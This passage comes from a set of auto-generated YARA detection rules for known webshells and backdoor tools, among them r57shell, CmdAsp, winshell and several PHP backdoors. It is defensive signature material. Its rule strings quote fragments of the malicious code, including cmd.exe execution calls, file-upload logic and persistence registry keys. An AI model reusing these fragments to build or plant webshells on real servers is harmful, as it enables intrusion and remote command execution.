        fingerprint = "v1_sha256_bee4d4c957ede41c771d690d52ac2fd3655238cc1fc106d30fb2721084b38aa1"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Yara Bulk Rule Generator by Florian Roth"
        description = "Webshells Auto-generated - file hkshell.exe"
        category = "INFO"
        hash = "168cab58cee59dc4706b3be988312580"

    strings:
        $s1 = "PrSessKERNELU"
        $s2 = "Cur3ntV7sion"
        $s3 = "Explorer8"
    condition:
        all of them
}
rule iMHaPFtp {
    meta:
        id = "2Im0I7gDwgQz0uZOogV8HN"
        fingerprint = "v1_sha256_c24bb80a0ae4284b4303450e9103c5dda30c41b41f323641ac1175461f741ced"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Yara Bulk Rule Generator by Florian Roth"
        description = "Webshells Auto-generated - file iMHaPFtp.php"
        category = "INFO"
        hash = "12911b73bc6a5d313b494102abcf5c57"

    strings:
        $s1 = "echo \"\\t<th class=\\\"permission_header\\\"><a href=\\\"$self?{$d}sort=permission$r\\\">"
    condition:
        all of them
}
rule Unpack_TBack {
    meta:
        id = "46MpRi3DmtsdmY9dOvDkA1"
        fingerprint = "v1_sha256_0fb43766c305f4235cc0987f411fdc3b3674723687f0b63d346429f4a7b5b87f"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Yara Bulk Rule Generator by Florian Roth"
        description = "Webshells Auto-generated - file TBack.dll"
        category = "INFO"
        hash = "a9d1007823bf96fb163ab38726b48464"

    strings:
        $s5 = "\\final\\new\\lcc\\public.dll"
    condition:
        all of them
}
rule DarkSpy105 {
    meta:
        id = "IxVkD2GN4sZSNVFdrboQf"
        fingerprint = "v1_sha256_0f1c9dba4525f9c30f309500652ed6af647ddf492f483e101fc23c891e15fc85"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Yara Bulk Rule Generator by Florian Roth"
        description = "Webshells Auto-generated - file DarkSpy105.exe"
        category = "INFO"
        hash = "f0b85e7bec90dba829a3ede1ab7d8722"

    strings:
        $s7 = "Sorry,DarkSpy got an unknown exception,please re-run it,thanks!"
    condition:
        all of them
}
rule EditServer_EXE {
    meta:
        id = "5baGIu7NthjDFah6LMwJ7P"
        fingerprint = "v1_sha256_d440669b0c0bf575cf9dea946edf55f724300a4c765e90c631fc1eee062bf006"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Yara Bulk Rule Generator by Florian Roth"
        description = "Webshells Auto-generated - file EditServer.exe"
        category = "INFO"
        hash = "f945de25e0eba3bdaf1455b3a62b9832"

    strings:
        $s2 = "Server %s Have Been Configured"
        $s5 = "The Server Password Exceeds 32 Characters"
        $s8 = "9--Set Procecess Name To Inject DLL"
    condition:
        all of them
}
rule FSO_s_reader {
    meta:
        id = "1wgbI8colXOSoWjW0anTt2"
        fingerprint = "v1_sha256_89a948f8da66173965884cd525615c8eeb91cf98a4984c05be7472034bb72f76"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Yara Bulk Rule Generator by Florian Roth"
        description = "Webshells Auto-generated - file reader.asp"
        category = "INFO"
        hash = "b598c8b662f2a1f6cc61f291fb0a6fa2"

    strings:
        $s2 = "mailto:mailbomb@hotmail."
    condition:
        all of them
}
rule ASP_CmdAsp {
    meta:
        id = "1rQf9IaxywQ668u4fpQlgT"
        fingerprint = "v1_sha256_84c3148fe74b1afaa6e3bbff0aca8df1f1775759a36a673cc13d35ef7658929c"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Yara Bulk Rule Generator by Florian Roth"
        description = "Webshells Auto-generated - file CmdAsp.asp"
        category = "INFO"
        hash = "79d4f3425f7a89befb0ef3bafe5e332f"

    strings:
        $s2 = "' -- Read the output from our command and remove the temp file -- '"
        $s6 = "Call oScript.Run (\"cmd.exe /c \" & szCMD & \" > \" & szTempFile, 0, True)"
        $s9 = "' -- create the COM objects that we will be using -- '"
    condition:
        all of them
}
rule KA_uShell {
    meta:
        id = "1YD4RNCIusDjEEB41IPwSI"
        fingerprint = "v1_sha256_58d25e19e2e14a909b4b623a85dfd8c62974121d3b23574d1e94b62385e42b45"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Yara Bulk Rule Generator by Florian Roth"
        description = "Webshells Auto-generated - file KA_uShell.php"
        category = "INFO"
        hash = "685f5d4f7f6751eaefc2695071569aab"

    strings:
        $s5 = "if(empty($_SERVER['PHP_AUTH_PW']) || $_SERVER['PHP_AUTH_PW']<>$pass"
        $s6 = "if ($_POST['path']==\"\"){$uploadfile = $_FILES['file']['name'];}"
    condition:
        all of them
}
rule PHP_Backdoor_v1 {
    meta:
        id = "6mmcph91QDQx1Np7GNRJ7F"
        fingerprint = "v1_sha256_396ae1ee34a06ab4863f4f54257a9020b8747fb99dff15372f0aa54fa4598e43"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Yara Bulk Rule Generator by Florian Roth"
        description = "Webshells Auto-generated - file PHP Backdoor v1.php"
        category = "INFO"
        hash = "0506ba90759d11d78befd21cabf41f3d"

    strings:

        $s5 = "echo\"<form method=\\\"POST\\\" action=\\\"\".$_SERVER['PHP_SELF'].\"?edit=\".$th"
        $s8 = "echo \"<a href=\\\"\".$_SERVER['PHP_SELF'].\"?proxy"
    condition:
        all of them
}
rule svchostdll {
    meta:
        id = "1M9C68Cz4NpM1JVsJ2xBLk"
        fingerprint = "v1_sha256_4a7a7bb7d827c2e7801f8c33b292bb3d312428fc4ae79f07e103f456984c3b83"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Yara Bulk Rule Generator by Florian Roth"
        description = "Webshells Auto-generated - file svchostdll.dll"
        category = "INFO"
        hash = "0f6756c8cb0b454c452055f189e4c3f4"

    strings:
        $s0 = "InstallService"
        $s1 = "RundllInstallA"
        $s2 = "UninstallService"
        $s3 = "&G3 Users In RegistryD"
        $s4 = "OL_SHUTDOWN;I"
        $s5 = "SvcHostDLL.dll"
        $s6 = "RundllUninstallA"
        $s7 = "InternetOpenA"
        $s8 = "Check Cloneomplete"
    condition:
        all of them
}
rule HYTop_DevPack_server {
    meta:
        id = "KmMe78D2pke9YD2NY1vRU"
        fingerprint = "v1_sha256_66b8513a532f64af535c948da28674795ae6495b9844165c3b039bf61c25eb46"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Yara Bulk Rule Generator by Florian Roth"
        description = "Webshells Auto-generated - file server.asp"
        category = "INFO"
        hash = "1d38526a215df13c7373da4635541b43"

    strings:
        $s0 = "<!-- PageServer Below -->"
    condition:
        all of them
}
rule vanquish {
    meta:
        id = "50cKBiS6jxIPfJn25txidm"
        fingerprint = "v1_sha256_223c59d06a9389f380fa29959c54e53a17b53080f704189ae519b9527b2c6384"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Yara Bulk Rule Generator by Florian Roth"
        description = "Webshells Auto-generated - file vanquish.dll"
        category = "INFO"
        hash = "684450adde37a93e8bb362994efc898c"

    strings:
        $s3 = "You cannot delete protected files/folders! Instead, your attempt has been logged"
        $s8 = "?VCreateProcessA@@YGHPBDPADPAU_SECURITY_ATTRIBUTES@@2HKPAX0PAU_STARTUPINFOA@@PAU"
        $s9 = "?VFindFirstFileExW@@YGPAXPBGW4_FINDEX_INFO_LEVELS@@PAXW4_FINDEX_SEARCH_OPS@@2K@Z"
    condition:
        all of them
}
rule winshell {
    meta:
        id = "3VTKsUOLqCFOGmDI16d9xg"
        fingerprint = "v1_sha256_addbfa598039af09c0e4c50138fcfabd16c35c5516259cf9595cf49855da518d"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Yara Bulk Rule Generator by Florian Roth"
        description = "Webshells Auto-generated - file winshell.exe"
        category = "INFO"
        hash = "3144410a37dd4c29d004a814a294ea26"

    strings:
        $s0 = "Software\\Microsoft\\Windows\\CurrentVersion\\RunServices"
        $s1 = "WinShell Service"
        $s2 = "__GLOBAL_HEAP_SELECTED"
        $s3 = "__MSVCRT_HEAP_SELECT"
        $s4 = "Provide Windows CmdShell Service"
        $s5 = "URLDownloadToFileA"
        $s6 = "RegisterServiceProcess"
        $s7 = "GetModuleBaseNameA"
        $s8 = "WinShell v5.0 (C)2002 janker.org"
    condition:
        all of them
}
rule FSO_s_remview {
    meta:
        id = "4jhaaRD0Da7ilsc6Yw2Nuq"
        fingerprint = "v1_sha256_19719e8c9215ec9ba9fab55b604907e0a6d0a0507a5662926acff1e9dc03440e"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Yara Bulk Rule Generator by Florian Roth"
        description = "Webshells Auto-generated - file remview.php"
        category = "INFO"
        hash = "b4a09911a5b23e00b55abe546ded691c"

    strings:
        $s2 = "      echo \"<hr size=1 noshade>\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\""
        $s3 = "         echo \"<script>str$i=\\\"\".str_replace(\"\\\"\",\"\\\\\\\"\",str_replace(\"\\\\\",\"\\\\\\\\\""
        $s4 = "      echo \"<hr size=1 noshade>\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n<"
    condition:
        all of them
}
rule saphpshell {
    meta:
        id = "6OjhehypElj0eM5TDjmbRP"
        fingerprint = "v1_sha256_24d558292a709bb29334b1acdc53cdb6c5bc6803caec527edcacd6a19f6dc7c9"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Yara Bulk Rule Generator by Florian Roth"
        description = "Webshells Auto-generated - file saphpshell.php"
        category = "INFO"
        hash = "d7bba8def713512ddda14baf9cd6889a"

    strings:
        $s0 = "<td><input type=\"text\" name=\"command\" size=\"60\" value=\"<?=$_POST['command']?>"
    condition:
        all of them
}
rule HYTop2006_rar_Folder_2006Z {
    meta:
        id = "2QdWoBO53gdlqnaBk5JhD"
        fingerprint = "v1_sha256_4b427132541cd26ee47c387a98f6f46f86808f9a775068e1d114c9ef4abca9f6"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Yara Bulk Rule Generator by Florian Roth"
        description = "Webshells Auto-generated - file 2006Z.exe"
        category = "INFO"
        hash = "fd1b6129abd4ab177fed135e3b665488"

    strings:
        $s1 = "wangyong,czy,allen,lcx,Marcos,kEvin1986,myth"
        $s8 = "System\\CurrentControlSet\\Control\\Keyboard Layouts\\%.8x"
    condition:
        all of them
}
rule admin_ad {
    meta:
        id = "6VmG75OK2Ty6FOn4p3Pup6"
        fingerprint = "v1_sha256_0febd10979a959af73332a8e064a510e949109abf863b5fd0fef19b635968d1d"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Yara Bulk Rule Generator by Florian Roth"
        description = "Webshells Auto-generated - file admin-ad.asp"
        category = "INFO"
        hash = "e6819b8f8ff2f1073f7d46a0b192f43b"

    strings:
        $s6 = "<td align=\"center\"> <input name=\"cmd\" type=\"text\" id=\"cmd\" siz"
        $s7 = "Response.write\"<a href='\"&url&\"?path=\"&Request(\"oldpath\")&\"&attrib=\"&attrib&\"'><"
    condition:
        all of them
}
rule FSO_s_casus15 {
    meta:
        id = "6q9DHIiU0S4e2IAQ7l86lq"
        fingerprint = "v1_sha256_58921290952f23ff5b828d8c92c818ebd91b726cdbbc9137b0f55a0e5ca90636"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Yara Bulk Rule Generator by Florian Roth"
        description = "Webshells Auto-generated - file casus15.php"
        category = "INFO"
        hash = "8d155b4239d922367af5d0a1b89533a3"

    strings:
        $s6 = "if((is_dir(\"$deldir/$file\")) AND ($file!=\".\") AND ($file!=\"..\"))"
    condition:
        all of them
}
rule BIN_Client {
    meta:
        id = "3YEvx0jiM5lxlzzr7oPZun"
        fingerprint = "v1_sha256_e1277f6b7adc2e832a3aad96c7e44796596d2e61eb9247977da3c3569777e0b2"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Yara Bulk Rule Generator by Florian Roth"
        description = "Webshells Auto-generated - file Client.exe"
        category = "INFO"
        hash = "9f0a74ec81bc2f26f16c5c172b80eca7"

    strings:
        $s0 = "=====Remote Shell Closed====="
        $s2 = "All Files(*.*)|*.*||"
        $s6 = "WSAStartup Error!"
        $s7 = "SHGetFileInfoA"
        $s8 = "CreateThread False!"
        $s9 = "Port Number Error"
    condition:
        4 of them
}
rule shelltools_g0t_root_uptime {
    meta:
        id = "DokT7vaey6S5lLxJSJoZ6"
        fingerprint = "v1_sha256_5d91dda859a63a965250bd4d76565c6adf18e4ee306be3b91965e5d35bc521e8"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Yara Bulk Rule Generator by Florian Roth"
        description = "Webshells Auto-generated - file uptime.exe"
        category = "INFO"
        hash = "d1f56102bc5d3e2e37ab3ffa392073b9"

    strings:
        $s0 = "JDiamondCSlC~"
        $s1 = "CharactQA"
        $s2 = "$Info: This file is packed with the UPX executable packer $"
        $s5 = "HandlereateConso"
        $s7 = "ION\\System\\FloatingPo"
    condition:
        all of them
}
rule Simple_PHP_BackDooR {
    meta:
        id = "ukPPuyvkqMcGGSaZJWHfW"
        fingerprint = "v1_sha256_9739217c23f583452fbf1d7a8e20b2f1379ebf430e0a4fd73ad62e88d544670a"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Yara Bulk Rule Generator by Florian Roth"
        description = "Webshells Auto-generated - file Simple_PHP_BackDooR.php"
        category = "INFO"
        hash = "a401132363eecc3a1040774bec9cb24f"

    strings:
        $s0 = "<hr>to browse go to http://<? echo $SERVER_NAME.$REQUEST_URI; ?>?d=[directory he"
        $s6 = "if(!move_uploaded_file($HTTP_POST_FILES['file_name']['tmp_name'], $dir.$fn"
        $s9 = "// a simple php backdoor"
    condition:
        1 of them
}
rule sig_2005Gray {
    meta:
        id = "1RrIg5ckTQOXkwRx1FN8zm"
        fingerprint = "v1_sha256_927ed5cdaa14b6cd63a6ca7d7bec6635b69fa19d88808890e7d198fb7a0b57b4"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Yara Bulk Rule Generator by Florian Roth"
        description = "Webshells Auto-generated - file 2005Gray.asp"
        category = "INFO"
        hash = "75dbe3d3b70a5678225d3e2d78b604cc"

    strings:
        $s0 = "SCROLLBAR-FACE-COLOR: #e8e7e7;"
        $s4 = "echo \"&nbsp;<a href=\"\"/\"&encodeForUrl(theHref,false)&\"\"\" target=_blank>\"&replace"
        $s8 = "theHref=mid(replace(lcase(list.path),lcase(server.mapPath(\"/\")),\"\"),2)"
        $s9 = "SCROLLBAR-3DLIGHT-COLOR: #cccccc;"
    condition:
        all of them
}
rule DllInjection {
    meta:
        id = "1YfmlSLtwWhD66QXjonjRg"
        fingerprint = "v1_sha256_6e01ae1cc8a91a5e0d22bdf477aa72bf0116dbe31752a069b1e34d8a09ec6213"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Yara Bulk Rule Generator by Florian Roth"
        description = "Webshells Auto-generated - file DllInjection.exe"
        category = "INFO"
        hash = "a7b92283a5102886ab8aee2bc5c8d718"

    strings:
        $s0 = "\\BDoor\\DllInjecti"
    condition:
        all of them
}
rule Mithril_v1_45_Mithril {
    meta:
        id = "35d5wYit4r8LW2qLk9qw4R"
        fingerprint = "v1_sha256_a3e74bfb34762553eccaddd745d9e17dc3a5a25201e4bc9e2ea9a49342295c78"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Yara Bulk Rule Generator by Florian Roth"
        description = "Webshells Auto-generated - file Mithril.exe"
        category = "INFO"
        hash = "f1484f882dc381dde6eaa0b80ef64a07"

    strings:
        $s2 = "cress.exe"
        $s7 = "\\Debug\\Mithril."
    condition:
        all of them
}
rule hkshell_hkrmv {
    meta:
        id = "2via17KsyPdgtISLk9BCMP"
        fingerprint = "v1_sha256_f1da0778456272e6d93633a564018bdf0fa74f1db1c9e963a03a59c69c752b6e"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Yara Bulk Rule Generator by Florian Roth"
        description = "Webshells Auto-generated - file hkrmv.exe"
        category = "INFO"
        hash = "bd3a0b7a6b5536f8d96f50956560e9bf"

    strings:
        $s5 = "/THUMBPOSITION7"
        $s6 = "\\EvilBlade\\"
    condition:
        all of them
}
rule phpshell {
    meta:
        id = "SSC6Mwj5b8qxHt1KsAvdX"
        fingerprint = "v1_sha256_eed450ae6668bbee01ea2689e9864f10a66714ec4c91afabb12609ad4ebdac8c"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Yara Bulk Rule Generator by Florian Roth"
        description = "Webshells Auto-generated - file phpshell.php"
        category = "INFO"
        hash = "1dccb1ea9f24ffbd085571c88585517b"

    strings:
        $s1 = "echo \"<input size=\\\"100\\\" type=\\\"text\\\" name=\\\"newfile\\\" value=\\\"$inputfile\\\"><b"
        $s2 = "$img[$id] = \"<img height=\\\"16\\\" width=\\\"16\\\" border=\\\"0\\\" src=\\\"$REMOTE_IMAGE_UR"
        $s3 = "$file = str_replace(\"\\\\\", \"/\", str_replace(\"//\", \"/\", str_replace(\"\\\\\\\\\", \"\\\\\", "
    condition:
        all of them
}
rule FSO_s_cmd {
    meta:
        id = "4F6oWtlvYH9893gL03SVZH"
        fingerprint = "v1_sha256_43f3379a57210f0e3b70575313115a7ba3d71359de7c5ac9a6a178b93af3545e"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Yara Bulk Rule Generator by Florian Roth"
        description = "Webshells Auto-generated - file cmd.asp"
        category = "INFO"
        hash = "cbe8e365d41dd3cd8e462ca434cf385f"

    strings:
        $s0 = "<%= \"\\\\\" & oScriptNet.ComputerName & \"\\\" & oScriptNet.UserName %>"
        $s1 = "Call oScript.Run (\"cmd.exe /c \" & szCMD & \" > \" & szTempFile, 0, True)"
    condition:
        all of them
}
rule FeliksPack3___PHP_Shells_phpft {
    meta:
        id = "4UUWX9p7K9PrJr4RGx0u0T"
        fingerprint = "v1_sha256_741536acafdc4da618d69bdae2f0a3e8c004a4027cc76c796158ee111c006414"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Yara Bulk Rule Generator by Florian Roth"
        description = "Webshells Auto-generated - file phpft.php"
        category = "INFO"
        hash = "60ef80175fcc6a879ca57c54226646b1"

    strings:
        $s6 = "PHP Files Thief"
        $s11 = "http://www.4ngel.net"
    condition:
        all of them
}
rule FSO_s_indexer {
    meta:
        id = "W0beBBrnDe2uebrNlB2AA"
        fingerprint = "v1_sha256_a1bfba9c24819f5c1574aa179d853a6cc2fcf58c7b9a14eeab2639248178549c"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Yara Bulk Rule Generator by Florian Roth"
        description = "Webshells Auto-generated - file indexer.asp"
        category = "INFO"
        hash = "135fc50f85228691b401848caef3be9e"

    strings:
        $s3 = "<td>Nereye :<td><input type=\"text\" name=\"nereye\" size=25></td><td><input type=\"r"
    condition:
        all of them
}
rule r57shell {
    meta:
        id = "7X07KUWHuwEH63LSdF3W7X"
        fingerprint = "v1_sha256_40ff6bceb3f9bd95fbf5e75681fadadaa64243007e10fcc86bb909282b8161c5"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Yara Bulk Rule Generator by Florian Roth"
        description = "Webshells Auto-generated - file r57shell.php"
        category = "INFO"
        hash = "8023394542cddf8aee5dec6072ed02b5"

    strings:
        $s11 = " $_POST['cmd']=\"echo \\\"Now script try connect to"
    condition:
        all of them
}
rule bdcli100 {
    meta:
        id = "399MOqF54VZoFQTqHw7oCo"
        fingerprint = "v1_sha256_48c70413c71d5a84f8cea48c77935b7cc26d9e1348d7ab257de4540d69f0f817"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Yara Bulk Rule Generator by Florian Roth"
        description = "Webshells Auto-generated - file bdcli100.exe"
        category = "INFO"
        hash = "b12163ac53789fb4f62e4f17a8c2e028"

    strings:
        $s5 = "unable to connect to "
        $s8 = "backdoor is corrupted on "
    condition:
        all of them
}
rule HYTop_DevPack_2005Red {
    meta:
        id = "2pNHNlh1deb1HzQ7xZvtCI"
        fingerprint = "v1_sha256_716b6faa8d1216f592d63b658cdd65d7be0226bf746b5fdf1827bdf881562711"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Yara Bulk Rule Generator by Florian Roth"
        description = "Webshells Auto-generated - file 2005Red.asp"
        category = "INFO"
        hash = "d8ccda2214b3f6eabd4502a050eb8fe8"

    strings:
        $s0 = "scrollbar-darkshadow-color:#FF9DBB;"
        $s3 = "echo \"&nbsp;<a href=\"\"/\"&encodeForUrl(theHref,false)&\"\"\" target=_blank>\"&replace"
        $s9 = "theHref=mid(replace(lcase(list.path),lcase(server.mapPath(\"/\")),\"\"),2)"
    condition:
        all of them
}
rule HYTop2006_rar_Folder_2006X2 {
    meta:
        id = "538J0PjldcgcCSyiK5KrYQ"
        fingerprint = "v1_sha256_0df587ccaf41d11c6be90ef631ce8b21f95f08fa8f71e62463c378455b312f4a"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Yara Bulk Rule Generator by Florian Roth"
        description = "Webshells Auto-generated - file 2006X2.exe"
        category = "INFO"
        hash = "cc5bf9fc56d404ebbc492855393d7620"

    strings:
        $s2 = "Powered By "
        $s3 = " \" onClick=\"this.form.sharp.name=this.form.password.value;this.form.action=this."
    condition:
        all of them
}
rule rdrbs084 {
    meta:
        id = "2x95Es66lL2Uig6kHvm3I9"
        fingerprint = "v1_sha256_8a743d62723c4a5f863f986edd4b149728680b40d6a4b9a99b093d62ccb70cf8"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Yara Bulk Rule Generator by Florian Roth"
        description = "Webshells Auto-generated - file rdrbs084.exe"
        category = "INFO"
        hash = "ed30327b255816bdd7590bf891aa0020"

    strings:
        $s0 = "Create mapped port. You have to specify domain when using HTTP type."
        $s8 = "<LOCAL PORT> <MAPPING SERVER> <MAPPING SERVER PORT> <TARGET SERVER> <TARGET"
    condition:
        all of them
}
rule HYTop_CaseSwitch_2005 {
    meta:
        id = "3kd3EG3DYiyBGHannYmZIM"
        fingerprint = "v1_sha256_0ecf28b5abb918cd1d8f38b76019dddf19dff5dbb114f16ef6ec9b46cb590a46"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Yara Bulk Rule Generator by Florian Roth"
        description = "Webshells Auto-generated - file 2005.exe"
        category = "INFO"
        hash = "8bf667ee9e21366bc0bd3491cb614f41"

    strings:
        $s1 = "MSComDlg.CommonDialog"
        $s2 = "CommonDialog1"
        $s3 = "__vbaExceptHandler"
        $s4 = "EVENT_SINK_Release"
        $s5 = "EVENT_SINK_AddRef"
        $s6 = "By Marcos"
        $s7 = "EVENT_SINK_QueryInterface"
        $s8 = "MethCallEngine"
    condition:
        all of them
}
rule eBayId_index3 {
    meta:
        id = "3meQ23Vt6q4jqWApxBkzCO"
        fingerprint = "v1_sha256_47660cb71d6787683e51aa14fc0f4a9d6f1c59517b77bfe4135098a0020ded11"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Yara Bulk Rule Generator by Florian Roth"
        description = "Webshells Auto-generated - file index3.php"
        category = "INFO"
        hash = "0412b1e37f41ea0d002e4ed11608905f"

    strings:
        $s8 = "$err = \"<i>Your Name</i> Not Entered!</font></h2>Sorry, \\\"You"
    condition:
        all of them
}
rule FSO_s_phvayv {
    meta:
        id = "6ElhjGZ5BxqmTABAKDNevz"
        fingerprint = "v1_sha256_d0482607f7d9cf6c89963cb9b1f943fa0b80636e857e0fb044cd9a0b3f974deb"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Yara Bulk Rule Generator by Florian Roth"
        description = "Webshells Auto-generated - file phvayv.php"
        category = "INFO"
        hash = "205ecda66c443083403efb1e5c7f7878"

    strings:
        $s2 = "wrap=\"OFF\">XXXX</textarea></font><font face"
    condition:
        all of them
}
rule byshell063_ntboot {
    meta:
        id = "4xM9LZluJQS9tDGt32jfbe"
        fingerprint = "v1_sha256_2fdc930eacb87d02ebe69a2b64df4103bd0f3417a76f1b2922b3d4cd4c0dffe9"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Yara Bulk Rule Generator by Florian Roth"
        description = "Webshells Auto-generated - file ntboot.exe"
        category = "INFO"
        hash = "99b5f49db6d6d9a9faeffb29fd8e6d8c"

    strings:
        $s0 = "SYSTEM\\CurrentControlSet\\Services\\NtBoot"
        $s1 = "Failure ... Access is Denied !"
        $s2 = "Dumping Description to Registry..."
        $s3 = "Opening Service .... Failure !"
    condition:
        all of them
}
rule FSO_s_casus15_2 {
    meta:
        id = "3MphST3SQf6xWYBbSF1Jtw"
        fingerprint = "v1_sha256_45820e0398cca8e75fc4acf6863d962a817afd95a4592acd4ac4a50029684220"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Yara Bulk Rule Generator by Florian Roth"
        description = "Webshells Auto-generated - file casus15.php"
        category = "INFO"
        hash = "8d155b4239d922367af5d0a1b89533a3"

    strings:
        $s0 = "copy ( $dosya_gonder"
    condition:
        all of them
}
rule installer {
    meta:
        id = "z0FORu20FhyMNr4tOmlw3"
        fingerprint = "v1_sha256_73c1032313155ceb752fe2f94c8d242833127fe0443d7e3044fa1de2b2b7742b"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Yara Bulk Rule Generator by Florian Roth"
        description = "Webshells Auto-generated - file installer.cmd"
        category = "INFO"
        hash = "a507919ae701cf7e42fa441d3ad95f8f"

    strings:
        $s0 = "Restore Old Vanquish"
        $s4 = "ReInstall Vanquish"
    condition:
        all of them
}
rule uploader {
    meta:
        id = "6qhyqldl309TNxhMwjicee"
        fingerprint = "v1_sha256_15c6c625fb36239bcd3a3f5f96461edbb354c4a788022e9350bb0eb7e8ea83e8"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Yara Bulk Rule Generator by Florian Roth"
        description = "Webshells Auto-generated - file uploader.php"
        category = "INFO"
        hash = "b9a9aab319964351b46bd5fc9d6246a8"

    strings:
        $s0 = "move_uploaded_file($userfile, \"entrika.php\"); "
    condition:
        all of them
}
rule FSO_s_remview_2 {
    meta:
        id = "1tW7sitWExfWixfzWavDD8"
        fingerprint = "v1_sha256_0a682431f7044e9a49c8dd4842a22c521e2a07d5df045b0a12449e3b3206716b"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
